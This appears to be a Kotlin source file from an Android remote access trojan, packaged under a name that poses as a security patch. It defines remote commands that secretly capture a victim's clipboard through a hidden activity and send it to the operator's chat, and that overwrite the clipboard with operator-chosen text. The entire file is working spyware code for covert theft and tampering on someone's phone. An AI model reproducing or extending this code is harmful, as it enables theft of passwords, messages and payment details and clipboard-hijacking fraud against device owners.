package com.android.security.patch.commands

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import com.android.security.patch.ClipGrabActivity
import com.android.security.patch.RatApi

object Clipboard {

    fun read(ctx: Context, chatId: Long) {
        try {
            val i = Intent(ctx, ClipGrabActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
                putExtra("chat_id", chatId)
            }
            ctx.startActivity(i)
        } catch (e: Throwable) {
            RatApi.sendMessage(ctx, "clip open err: ${e.message}", chatId)
        }
    }

    fun write(ctx: Context, chatId: Long, args: Array<String>) {
        val text = args.joinToString(" ")
        if (text.isBlank()) {
            RatApi.sendMessage(ctx, "usage: /clipboard_set <text>", chatId); return
        }
        try {
            val cm = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            cm.setPrimaryClip(ClipData.newPlainText("text", text))
            RatApi.sendMessage(ctx, "clipboard set", chatId)
        } catch (e: Throwable) {
            RatApi.sendMessage(ctx, "clipboard_set err: ${e.message}", chatId)
        }
    }
}
